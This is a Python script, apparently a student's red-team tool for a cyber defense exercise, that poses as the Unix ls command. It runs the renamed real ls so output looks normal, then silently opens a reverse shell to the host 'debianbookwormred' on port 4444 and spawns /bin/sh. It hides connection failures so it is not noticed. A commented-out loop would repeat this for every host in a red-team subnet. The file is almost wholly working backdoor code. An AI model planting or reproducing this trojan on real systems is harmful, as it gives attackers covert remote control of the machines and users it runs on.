# Daniel Wolosiuk
# Cyber Defense Techniques 2025 Red Team Tool
# Oct 17, 2025
# dw4102@rit.edu

import subprocess
import sys
import socket
import os
import pty


def main():
    args = sys.argv[1:]
    run_real_ls(args)
    malicious_component()

def run_real_ls(arguments):
    # The real ls command will be hidden on the system. In this case, "who.debianutils"
    # Moving the real ls command will occur in ansible
    ls_command_with_args = ["who.debianutils", "--color=auto"]
    #ls_command_with_args = ["ls", "--color=auto"]
    ls_command_with_args.extend(arguments)
    ls_result = subprocess.call(ls_command_with_args)

def malicious_component():
    # Initial specialized connection configuration
    RHOST="debianbookwormred"
    RPORT=4444
    s=socket.socket()
    try:
        s.connect((RHOST, RPORT))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)
    except socket.error:
        return None # handle the error silently to not give the binary away

    # Red team subnet is 10.0.20.0/24
    # Reach out to every host in red team subnet for every ls command
    # Same as before connection configuration, will just iterate for every red host
    # Commented out because causes binary to work slowly
    """
    for index in range(1, 255):
        print(index)
        RHOST = "10.0.20." + str(index)
        s=socket.socket()
        try:
            s.connect((RHOST, RPORT))
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
            subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)
        except socket.error:
            return None
    """

 
if __name__ == "__main__":
    main()